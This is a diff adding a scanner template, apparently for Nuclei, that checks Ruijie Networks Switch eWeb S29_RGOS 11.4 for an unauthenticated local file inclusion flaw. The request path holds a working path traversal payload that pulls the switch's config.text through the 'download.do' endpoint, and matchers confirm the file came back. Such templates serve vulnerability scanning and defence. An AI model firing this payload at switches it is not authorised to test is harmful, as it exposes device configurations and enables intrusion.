@@ -1,0 +1,30 @@
+id: ruijie-networks-lfi-1
+info:
+  author: pikpikcu
+  description: A vulnerability in Ruijie Networks Switch allows remote unauthenticated
+    attackers to access locally stored files and retrieve their content via the 'download.do'
+    endpoint.
+  name: Ruijie Networks Switch eWeb S29_RGOS 11.4 LFI
+  reference:
+  - https://exploit-db.com/exploits/48755
+  severity: high
+  tags: ruijie,lfi
+requests:
+- matchers:
+  - part: header
+    type: word
+    words:
+    - filename="config.text"
+    - 'Content-Type: application/octet-stream'
+  - condition: and
+    part: body
+    type: word
+    words:
+    - version S29_RGOS 11.4
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/download.do?file=../../../../config.text'
